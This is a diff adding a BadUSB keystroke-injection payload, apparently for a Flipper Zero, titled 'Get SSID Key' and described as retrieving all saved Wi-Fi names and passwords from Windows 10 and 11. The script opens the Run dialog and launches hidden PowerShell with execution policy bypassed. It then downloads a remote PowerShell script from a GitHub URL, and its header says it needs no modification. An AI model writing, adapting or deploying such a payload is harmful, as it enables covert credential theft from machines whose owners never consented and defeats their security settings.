@@ -1,0 +1,16 @@
+REM     Title: Get SSID Key
+REM
+REM     Author: Julien Mousqueton
+REM
+REM     Description: This payload get all SSID and associated key (password) registered on Windows 
+REM
+REM     Target: Windows 10, 11 (French or US language) 
+REM
+REM     --------------------------------------------------------------------------------------
+REM     THIS PAYLOAD IS PLUG AND PLAY. NO MODIFICATIONS NEEDED SIMPLY RUN THE CODE DOWN BELOW.
+REM     --------------------------------------------------------------------------------------
+REM
+GUI r
+DELAY 500
+STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr https://raw.githubusercontent.com/JMousqueton/FlipperZero/main/BadUSB/GetSSIDKEY/GetSSIDKey.ps1
+ENTER
